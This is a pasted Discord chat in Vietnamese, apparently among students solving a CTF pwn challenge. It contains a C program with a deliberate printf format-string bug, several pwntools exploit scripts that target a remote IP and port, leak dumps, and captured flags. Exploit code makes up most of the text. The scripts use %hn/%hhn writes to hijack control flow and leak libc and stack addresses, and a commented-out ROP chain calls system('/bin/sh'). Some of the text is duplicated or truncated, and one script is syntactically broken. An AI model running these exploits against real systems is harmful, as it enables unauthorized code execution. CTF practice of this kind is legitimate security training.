# #!/usr/bin/env python3

# from pwn import *

# context.terminal = ["foot", "-e", "sh", "-c"]

# exe = ELF('001_patched', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
# context.binary = exe

# info = lambda msg: log.info(msg)
# s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
# sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
# sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
# sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
# sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
# sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
# sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
# slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
# def GDB():
#     if not args.REMOTE:
#         gdb.attach(p, gdbscript='''
#         b*show+75

#         c
#         ''')
#         sleep(1)
# # if args.REMOTE:
# #     p = remote('14.225.212.104', 9002)
# # else:
# #     p = process([exe.path])
 
# # GDB()

# main_remote = 0x4012d0
# main_local = 0x401246
# # 0x4012c
# # server: 136 - rbp 1, 138 - rbp 2
# def main():
#     load = flat(
#         b'%c'*164,
#         b'%c',
#         f'%{0xf8 -165}hhn',
#         f'%{0x1246 - 136}c%169$hn', # server

#     )
#     # input()
#     sa(b'> ', load)
    

# count = 0 
# while count<1:
# # while True:
#     count += 1
#     if count % 10 == 0:
#         print(f"Attempt {count}...")

#     try:

#         if args.REMOTE:
#             p = remote('14.225.212.104', 9002)
#         else:
#             p = process([exe.path])

#         GDB()
        
#         main()

#     #     res = p.recvuntil(b'> ', timeout=2)
        
#     #     if b'> ' in res:
#     #         print(f"[*] Success at attempt {count}!")
#     #         p.interactive()
#     #         break
#     except EOFError:
#         # If the program crashes (wrong guess), just try again
#         p.close()
#         continue

# # p.interactive()

# p.interactive()


Saitomu!
saitomu
🗿 just leak to done

Quang AT22

 — Hôm qua lúc 19:49
@pwn
─$ python3 solve.py REMOTE
[+] Opening connection to 14.225.212.104 on port 9002: Done
[*] leak[0]: b'0x7ffec0fe0290'
[*] leak[1]: b'0x3ff'
[*] leak[2]: b'0x7fb3fe6e6a91'
[*] leak[3]: b'0x2'
Mở rộng
message.txt
9 KB
stack của nó như này
Thịnh - AT20N — Hôm qua lúc 20:37
VSL{88ecbb95036bae2a5ec5530625abab1d}
Dũng AT22

 — Hôm qua lúc 21:13
pwn2: nc 14.225.212.104 9002
Trần Quốc An  AT20N0101

 — Hôm qua lúc 21:51
Loại tệp đính kèm: unknown
vku
52.02 KB
#!/bin/bash

echo -n "[Setup] Please enter your secret key (max 100 chars): "
read -n 100 USER_SECRET
echo ""
Mở rộng
run.sh
1 KB
Loại tệp đính kèm: unknown
libstdc++.so.6
2.80 MB
Loại tệp đính kèm: unknown
libm.so.6
951.54 KB
Loại tệp đính kèm: unknown
libgcc_s.so.1
185.50 KB
Loại tệp đính kèm: unknown
libc.so.6
5.94 MB
Loại tệp đính kèm: unknown
ld-linux-x86-64.so.2
231.07 KB
Loại tệp đính kèm: unknown
solve
3.19 KB
Thịnh - AT20N — Hôm qua lúc 23:34
a quang oi chay lai lenh nay vs 0x300 di a
size la 0x300
a cho em xin script chay ra tep do luon
@Quang AT22
Quang AT22

 — Hôm qua lúc 23:46
ok
#!/usr/bin/python3

from pwn import *

exe = ELF('chall', checksec=False)

context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data: p.send(data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        input()


if args.REMOTE:
    p = remote('14.225.212.104', 9002)
    # host = sys.argv[1].split(":")
    # p  = remote(host[0],int(host[1]) )
else:
    p = process([exe.path])
GDB()
pl = b"%p|"*0x100
sa(b"> ", pl)

for i in range(0x100):
    leak = p.recvuntil(b"|").rstrip(b"|")
    info(f"leak[{i}]: {leak}")
p.interactive()
Trần Quốc An  AT20N0101

 — Hôm qua lúc 23:47
j
Loại tệp đính kèm: unknown
solve
4.15 KB
Trần Quốc An  AT20N0101

 — 00:15
Loại tệp đính kèm: unknown
solve
3.62 KB
Thịnh - AT20N — 00:27
#include <stdio.h>
#include <unistd.h>

void init(){
    setvbuf(stdin,  NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

void show(void){
    char buf[0x500];

    printf("> ");
    read(0, buf, sizeof(buf) - 1);
    printf(buf);
}

void show_1(void){
    show();
}

int main(){
    init();
    show_1();

    return 0;
}
Trần Quốc An  AT20N0101

 — 00:36
@Nightcore
Loại tệp đính kèm: archive
data.zip
6.71 MB
Thịnh - AT20N — 00:49
#include <stdio.h>
#include <unistd.h>

void init(){
    setvbuf(stdin,  NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

int show(void){
    char buf[0x500];

    printf("> ");
    read(0, buf, sizeof(buf) - 1);
    printf(buf);
    return 0;
}

int show_1(void){
    show();
    return 0;
}

int main(){
    init();
    show_1();

    return 0;
}
#!/usr/bin/env python3

from pwn import *

exe = ELF("./001_patched")
libc = ELF("./libc.so.6")
Mở rộng
solve.py
5 KB
Thịnh - AT20N — 01:30
Loại tệp đính kèm: unknown
libc.so.6
5.94 MB
Loại tệp đính kèm: unknown
ld-2.39.so
231.07 KB
Dũng AT22

 — 08:18
def main():
    load = flat(
        b'%c'134,
        b'%2c',
        f'%hhn',
        f'%{0x1218 - 136}c%140$hn', # server

    )
    # input()
    sa(b'> ', load)


count = 0 
while True:
    count += 1
    if count % 10 == 0:
        print(f"Attempt {count}...")

    try:
        if args.REMOTE:
            p = remote('14.225.212.104', 9002)
        else:
            p = process([exe.path])
        main()

        res = p.recvuntil(b'> ', timeout=1)

        if b'> ' in res:
            print(f"[] Success at attempt {count}!")
            p.interactive()
            break
    except EOFError:
        # If the program crashes (wrong guess), just try again
        p.close()
        continue
@Thịnh - AT20N
Thịnh - AT20N — 08:35
#!/usr/bin/env python3

from pwn import *

exe = ELF("./001_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe
context.terminal = ['konsole', '-e']

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, num: sla(msg, str(num).encode())
san = lambda msg, num: sa(msg, str(num).encode())
sln = lambda num: sl(str(num).encode())
sn = lambda num: s(str(num).encode())
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript=f'''
        b* show +75
        c
        ''')

if args.REMOTE:
    conn = 'nc 14.225.212.104 9002'.split()
    p = remote(conn[1], int(conn[2]))
else:
    p = process(exe.path)
# GDB()

main = 0x4012d0
# main = 0x0000000000401246



pl = b''
# pl += b'%16$s'
# pl += b'%c'*164 + f'%{4}c'.encode() + b'%hhn'+ f'%{0x146 - 168}c%hhn\x00'.encode()
pl += b'%c'*134 + f'%{34}c'.encode() + b'%hhn'+ f'%{0xd0 + 88}c%hhn'.encode()
pl += b'_________%136$s%138$p%141$p%140$p%138$s\x00'
# pl += b'%166$n'
# pl += b'%p_'*0x100
# pl = pl.ljust(0x50, b'a')
# pl += p64(0x4012e2 + 5)*0x20

sla(b'>', pl)

ru(b'_________')
rbp_main = u64(r(6) + b'\x00\x00')
print(f'rbp_change: {hex(rbp_main)}')
stack_2 = int(r(14), 16)
print(f'stack 2: {hex(stack_2)}')
libc.address = int(r(14), 16) - 0x2a1ca
print(f'libc: {hex(libc.address)}')
stack = int(r(14), 16) - 0x2a1ca
print(f'stack: {hex(stack)}')
rbp_3 = r(8)
print(f'variable: {(rbp_3)}')


pop_rdi = libc.address + 0x000000000010f78b
pop_rax = libc.address + 0x00000000000dd237
pop_pop = libc.address + 0x00000000001614e3 + 5

addr = []
cnt = 0
def win(x):
    global cnt
    for i in range(3):
        addr.append((((x >> (i*16)) & 0xffff) + 0x10000 * cnt))
        cnt += 1
win(main)

pl = b""

pl += b'zzz%10$s%11$s%12$s%13$s'
pl = pl.ljust(0x20, b'a')
pl += p64(stack_2 - 0x410)
pl += p64(stack_2 - 0x418)
pl += p64(stack_2 - 0x420)
pl += p64(stack_2 - 0x428)

# pl += f"%{addr[0]}c%19$hn".encode()
# pl += f"%{addr[1] - addr[0]}c%20$hn".encode()
# pl += f"%{addr[2] - addr[1]}c%21$hn".encode()

# pl = pl.ljust(0x28, b'x')
# pl += p64(pop_rdi)
# pl += p64(next(libc.search(b'/bin/sh')))
# pl += p64(libc.sym['do_system'] + 2)
# pl = pl.ljust(0x60, b'a')
# pl += b'b'*8
... (Còn16 dòng dòng)
Thu gọn
solve.py
3 KB
Trần Quốc An  AT20N0101

 — 09:09
@Huy - AT21N01
Loại tệp đính kèm: unknown
solve
3.59 KB
Thịnh - AT20N — 09:10
Loại tệp đính kèm: unknown
001
15.70 KB
Thịnh - AT20N — 09:48
VSL{ce2f920078c1b0f406a5a1999cfecbfa}
﻿
#!/usr/bin/env python3

from pwn import *

exe = ELF("./001_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe
context.terminal = ['konsole', '-e']

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, num: sla(msg, str(num).encode())
san = lambda msg, num: sa(msg, str(num).encode())
sln = lambda num: sl(str(num).encode())
sn = lambda num: s(str(num).encode())
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript=f'''
        b* show +75
        c
        ''')

if args.REMOTE:
    conn = 'nc 14.225.212.104 9002'.split()
    p = remote(conn[1], int(conn[2]))
else:
    p = process(exe.path)
# GDB()

main = 0x4012d0
# main = 0x0000000000401246



pl = b''
# pl += b'%16$s'
# pl += b'%c'*164 + f'%{4}c'.encode() + b'%hhn'+ f'%{0x146 - 168}c%hhn\x00'.encode()
pl += b'%c'*134 + f'%{34}c'.encode() + b'%hhn'+ f'%{0xd0 + 88}c%hhn'.encode()
pl += b'_________%136$s%138$p%141$p%140$p%138$s\x00'
# pl += b'%166$n'
# pl += b'%p_'*0x100
# pl = pl.ljust(0x50, b'a')
# pl += p64(0x4012e2 + 5)*0x20

sla(b'>', pl)

ru(b'_________')
rbp_main = u64(r(6) + b'\x00\x00')
print(f'rbp_change: {hex(rbp_main)}')
stack_2 = int(r(14), 16)
print(f'stack 2: {hex(stack_2)}')
libc.address = int(r(14), 16) - 0x2a1ca
print(f'libc: {hex(libc.address)}')
stack = int(r(14), 16) - 0x2a1ca
print(f'stack: {hex(stack)}')
rbp_3 = r(8)
print(f'variable: {(rbp_3)}')


pop_rdi = libc.address + 0x000000000010f78b
pop_rax = libc.address + 0x00000000000dd237
pop_pop = libc.address + 0x00000000001614e3 + 5

addr = []
cnt = 0
def win(x):
    global cnt
    for i in range(3):
        addr.append((((x >> (i*16)) & 0xffff) + 0x10000 * cnt))
        cnt += 1
win(main)

pl = b""

pl += b'zzz%10$s%11$s%12$s%13$s'
pl = pl.ljust(0x20, b'a')
pl += p64(stack_2 - 0x410)
pl += p64(stack_2 - 0x418)
pl += p64(stack_2 - 0x420)
pl += p64(stack_2 - 0x428)

# pl += f"%{addr[0]}c%19$hn".encode()
# pl += f"%{addr[1] - addr[0]}c%20$hn".encode()
# pl += f"%{addr[2] - addr[1]}c%21$hn".encode()

# pl = pl.ljust(0x28, b'x')
# pl += p64(pop_rdi)
# pl += p64(next(libc.search(b'/bin/sh')))
# pl += p64(libc.sym['do_system'] + 2)
# pl = pl.ljust(0x60, b'a')
# pl += b'b'*8
# # pl += p64(main + 115)
# pl += p64(stack - 0x438)
# pl += p64(stack - 0x438 + 2)
# pl += p64(stack - 0x438 + 4)

sla(b'>', pl)
# sl(b'ls')

# sl(b'%p________'*0x10)

# print(f'[+]printf: {hex(libc.sym['printf'])}')
# print(f'[+]libc_start_main: {hex(libc.sym['__libc_start_main'] + 122)}')


p.interactive()